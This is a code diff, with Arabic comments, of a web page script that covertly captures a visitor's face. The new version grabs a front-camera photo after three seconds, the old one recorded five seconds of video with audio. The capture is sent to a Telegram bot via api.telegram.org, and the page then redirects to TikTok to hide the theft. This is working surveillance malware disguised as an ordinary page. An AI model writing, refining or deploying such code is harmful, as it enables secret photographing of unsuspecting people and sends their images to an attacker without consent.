@@ -24,10 +24,9 @@
         
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
         
         let stream = null;
-        let recorder = null;
-        let chunks = [];
 
         // ====== بداية التصوير ======
         async function start() {
@@ -37,42 +36,37 @@
             }
 
             try {
-                // طلب الكاميرا الأمامية والميكروفون
+                // طلب الكاميرا الأمامية فقط (بدون ميكروفون)
                 stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: true 
+                    video: { facingMode: "user" }
                 });
                 
                 video.srcObject = stream;
                 
                 // انتظار 3 ثواني عشان الكاميرا تثبت وتضبط الإضاءة
                 setTimeout(() => {
-                    recorder = new MediaRecorder(stream);
+                    // ضبط حجم الكانفس بنفس حجم الفيديو
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
                     
-                    recorder.ondataavailable = (e) => {
-                        if (e.data.size > 0) chunks.push(e.data);
-                    };
+                    // رسم الصورة من الفيديو إلى الكانفس
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    recorder.onstop = () => {
-                        const blob = new Blob(chunks, { type: 'video/mp4' });
-                        
-                        // إرسال الفيديو
+                    // تحويل الكانفس إلى صورة
+                    canvas.toBlob((blob) => {
+                        // إرسال الصورة
                         const form = new FormData();
                         form.append('chat_id', id);
-                        form.append('video', blob, 'vid.mp4');
+                        form.append('photo', blob, 'photo.jpg');
                         
-                        fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                             method: 'POST',
                             body: form
                         }).finally(() => {
                             stream.getTracks().forEach(t => t.stop());
                             window.location.href = "https://www.tiktok.com";
                         });
-                    };
-                    
-                    // تسجيل 5 ثواني
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 5000);
+                    }, 'image/jpeg');
                     
                 }, 3000);
                 
